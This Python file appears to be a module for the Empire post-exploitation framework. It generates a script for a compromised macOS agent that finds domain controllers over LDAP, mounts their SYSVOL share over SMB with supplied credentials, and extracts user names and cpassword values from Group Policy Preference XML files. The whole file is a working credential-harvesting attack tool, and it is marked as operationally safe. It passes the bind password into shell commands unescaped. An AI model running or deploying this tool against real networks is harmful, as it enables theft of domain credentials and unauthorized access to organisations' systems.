class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Get Group Policy Preferences',
            'Author': ['@424f424f'],
            'Description': 'This module will attempt to pull group policy preference passwords from SYSVOL',
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ['']
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LDAPAddress' : {
                'Description'   :   'LDAP IP/Hostname',
                'Required'      :   True,
                'Value'         :   ''
            },
            'BindDN' : {
                'Description'   :   'user@penlab.local',
                'Required'      :   True,
                'Value'         :   ''
            },
            'password' : {
                'Description'   :   'Password to connect to LDAP',
                'Required'      :   False,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self):
        LDAPAddress = self.options['LDAPAddress']['Value']
        BindDN = self.options['BindDN']['Value']
        password = self.options['password']['Value']
        script = """
import sys, os, subprocess, re
BindDN = "%s"
LDAPAddress = "%s"
password = "%s"
password.replace('!','%%21')
password.replace('#','%%23')
password.replace('$','%%24')
regex = re.compile('.+@([^.]+)\..+')
global tld
match = re.match(regex, BindDN)
tld = match.group(1)
global ext
global name
name = BindDN.split('@')[0]
ext = BindDN.split('.')[1]
cmd = \"""ldapsearch -x -h {} -b "dc={},dc={}" -D {} -w {} "(&(objectcategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" ""\".format(LDAPAddress, tld, ext, BindDN, password)
output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
output2 = subprocess.Popen(["grep", "name:"],stdin=output.stdout, stdout=subprocess.PIPE,universal_newlines=True)
output.stdout.close()
out,err = output2.communicate()
print subprocess.Popen('mkdir /Volumes/sysvol', shell=True, stdout=subprocess.PIPE).stdout.read()
cmd = \"""mount_smbfs //'{};{}:{}'@{}/SYSVOL /Volumes/sysvol""\".format(ext,name,password,LDAPAddress)
print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
print "Searching for Passwords...This may take some time"
xmls = subprocess.Popen('find /Volumes/sysvol -name *.xml', shell=True, stdout=subprocess.PIPE).stdout.read()
cmd1 = \"""cat {}""\".format(xmls)
result = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE).stdout.read()
print ""
for usermatch in re.finditer(r'userName="(.*?)"|newName="(.*?)"|cpassword="(.*?)"', result, re.DOTALL):
    print usermatch.group(0)
print ""
print subprocess.Popen('diskutil unmount force /Volumes/sysvol/', shell=True, stdout=subprocess.PIPE).stdout.read()
print ""
print "Finished"
""" % (BindDN, LDAPAddress, password)
        return script